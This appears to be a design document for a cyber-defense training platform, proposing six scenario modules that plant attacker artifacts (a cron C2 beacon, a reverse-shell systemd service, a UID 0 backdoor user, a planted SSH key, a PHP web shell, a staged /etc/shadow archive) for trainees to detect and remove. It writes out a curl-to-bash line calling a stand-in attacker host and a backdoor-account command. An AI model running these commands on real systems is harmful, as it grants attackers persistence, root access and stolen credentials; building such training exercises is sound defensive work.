# Payload Modules

**Date:** 2026-04-11  
**Status:** Proposed  
**Priority:** Medium — expands red team content with zero infrastructure changes

---

## Context

`modules/payloads/` is empty. The platform already has full payload infrastructure: the `payload` type is recognized by the selector, 4 verification types (`file_absent`, `file_hash_changed`, `cron_not_present`, `user_not_exists`) are implemented and tested, `audit.py` collects `file_existence`, `file_hashes`, `cron_entries`, and `passwd_users` broadly. The only thing missing is actual module content. One small code change in `builder/caldera.py` is also needed.

---

## Design

### Modules (6 total)

---

**`malicious_cron_job`** — C2 beacon via cron  
- Scenario: attacker installed a cron job that beacons to a C2 server every 5 minutes  
- Script: `(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/curl -s http://evil.attacker.com/beacon | /bin/bash") | crontab -`  
- Verification: `cron_not_present`, pattern: `evil.attacker.com/beacon`  
- Difficulty: easy (100 pts) | Category: persistence  
- ATT&CK: T1053.003 (Scheduled Task/Job: Cron)

---

**`backdoor_systemd_service`** — disguised reverse shell as systemd unit  
- Scenario: a service named `system-health.service` is a reverse shell that starts on boot  
- Script: creates `/etc/systemd/system/system-health.service` with a bash reverse shell `ExecStart`, enables and starts it  
- Verification: `file_absent`, path: `/etc/systemd/system/system-health.service`  
- Difficulty: medium (200 pts) | Category: persistence  
- ATT&CK: T1543.002 (Create or Modify System Process: Systemd Service)

---

**`rogue_user_account`** — UID 0 backdoor account  
- Scenario: a user `svc_update` was created with UID 0 (root equivalent)  
- Script: `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svc_update && echo 'svc_update:Backdoor123!' | chpasswd`  
- Verification: `user_not_exists`, user: `svc_update`  
- Difficulty: medium (200 pts) | Category: persistence  
- ATT&CK: T1136.001 (Create Account: Local Account)

---

**`planted_ssh_key_webuser`** — attacker SSH key on service account  
- Scenario: attacker placed their SSH public key in `www-data`'s authorized_keys  
- Script: creates `/home/www-data/.ssh/authorized_keys` with a fake attacker key (comment: `deploy@pipeline`)  
- Verification: `file_not_contains`, path: `/home/www-data/.ssh/authorized_keys`, pattern: `deploy@pipeline`  
- Difficulty: easy (100 pts) | Category: access  
- ATT&CK: T1098.004 (Account Manipulation: SSH Authorized Keys)  
- Conflicts with: `unauthorized_ssh_key` (avoid two SSH key modules)

---

**`webshell_upload`** — PHP web shell in upload directory  
- Scenario: a PHP web shell was uploaded to the inventory app's upload directory  
- Script: creates `/opt/inventory/uploads/shell.php` with a simple PHP eval shell  
- Verification: `file_absent`, path: `/opt/inventory/uploads/shell.php`  
- Difficulty: hard (300 pts) | Category: access  
- Requires: `inventory_dashboard` (the Flask app that creates `/opt/inventory/uploads/`)  
- ATT&CK: T1505.003 (Server Software Component: Web Shell)

---

**`exfil_staging_archive`** — data exfiltration staging artifact  
- Scenario: attacker staged a compressed archive of sensitive data in `/tmp` for exfiltration  
- Script: creates `/tmp/.cache_update.tar.gz` containing copies of `/etc/shadow` and `/etc/passwd`, creates breadcrumb at `/var/log/.exfil_log`  
- Verification: `file_absent`, path: `/tmp/.cache_update.tar.gz`  
- Difficulty: hard (300 pts) | Category: exfiltration  
- ATT&CK: T1074.001 (Data Staged: Local Data Staging)

---

### YAML Template (example: `malicious_cron_job`)

```yaml
id: malicious_cron_job
name: Malicious cron job beaconing to C2
description: A cron job was installed that sends a beacon to an attacker's C2 server every 5 minutes, executing any commands returned.
type: payload
difficulty: easy
points: 100
category: persistence
tags: [cron, c2, beacon, persistence]
conflicts: []
requires: []
script: malicious_cron_job.sh
verification:
  type: cron_not_present
  pattern: evil.attacker.com/beacon
suggested_fix: "Remove the malicious cron entry: crontab -l | grep -v 'evil.attacker.com' | crontab -"
hints:
  - "Check for unusual scheduled tasks running as root"
  - "Look at crontab entries: crontab -l"
  - "Look for entries that download and execute remote content"
caldera:
  tactic: persistence
  technique:
    attack_id: T1053.003
    name: "Scheduled Task/Job: Cron"
  recon:
    description: "Check for C2 beacon cron job"
    command: |
      crontab -l 2>/dev/null | grep -c "evil.attacker.com" \
        && echo "PAYLOAD: C2 beacon cron found" \
        || echo "CLEAN: no beacon cron"
  exploit:
    description: "Demonstrate C2 beacon execution path"
    command: |
      crontab -l 2>/dev/null | grep "evil.attacker.com"
```

All 6 modules follow this same YAML structure.

### state.json Integration (Docker flow)

For `file_absent` and `file_hash_changed` verification, the Docker builder must add the relevant paths to `state.json`'s `check_paths` / `hash_paths` at build time. The builder should:
- Collect `check_paths` from payload modules whose verification type is `file_absent` — add the `path` value
- Collect `hash_paths` from payload modules whose verification type is `file_hash_changed` — add the `path` value

For the VM flow, Feature 1 (VM Verification) writes a `state.json` onto VMs during provisioning with these same lists derived from `VMModule` assignments.

### Caldera Integration Fix

`builder/caldera.py` line ~35 currently filters:
```python
if m.type != "vulnerability" or not m.caldera:
```

Change to:
```python
if m.type not in ("vulnerability", "payload") or not m.caldera:
```

This makes payload modules' abilities appear in the generated Caldera plugin alongside vulnerability modules.

### Quota Integration

Payload modules use the `"payload"` key in `EVENT_QUOTA`:
```json
{"vulnerability": {"easy": 2}, "hardening": {"easy": 1}, "payload": {"easy": 1, "medium": 1}}
```

The selector already handles the `payload` type. `.env.example` needs documentation for this key.

---

## Files to Create

```
modules/payloads/malicious_cron_job/
  malicious_cron_job.yaml
  malicious_cron_job.sh

modules/payloads/backdoor_systemd_service/
  backdoor_systemd_service.yaml
  backdoor_systemd_service.sh

modules/payloads/rogue_user_account/
  rogue_user_account.yaml
  rogue_user_account.sh

modules/payloads/planted_ssh_key_webuser/
  planted_ssh_key_webuser.yaml
  planted_ssh_key_webuser.sh

modules/payloads/webshell_upload/
  webshell_upload.yaml
  webshell_upload.sh

modules/payloads/exfil_staging_archive/
  exfil_staging_archive.yaml
  exfil_staging_archive.sh
```

## Files to Modify

| Action | Path | Change |
|--------|------|--------|
| Modify | `builder/caldera.py` | Extend type filter to include `"payload"` |
| Modify | `.env.example` | Document `payload` key in EVENT_QUOTA |
| Modify | `builder/main.py` or `templates/Dockerfile.j2` | Collect `check_paths`/`hash_paths` from payload modules |

---

## Verification / Testing

- **Module loading:** `load_all_modules()` picks up all 6 modules and YAML parses without error
- **Build test:** add `"payload": {"easy": 1, "medium": 1, "hard": 1}` to `.env.test`, run e2e, verify payload modules are selected and their scripts execute
- **Verification test:** in built container, confirm artifacts exist, remove them, run `audit.py`, submit to `/api/verify`, verify completion
- **Caldera test:** verify `generate_caldera_export()` includes payload abilities in the plugin after the type filter fix
- **Unit:** extend `test_verify_new_types.py` with scenarios matching each payload's verification spec

---

## Dependencies

- No dependencies on other features for Docker flow — can be implemented and tested immediately
- **Feature 1 (VM Verification)** — VM flow needs `state.json` with `check_paths`/`hash_paths` written during provisioning
- `webshell_upload` requires the `inventory_dashboard` application_external module (declared via `requires`)
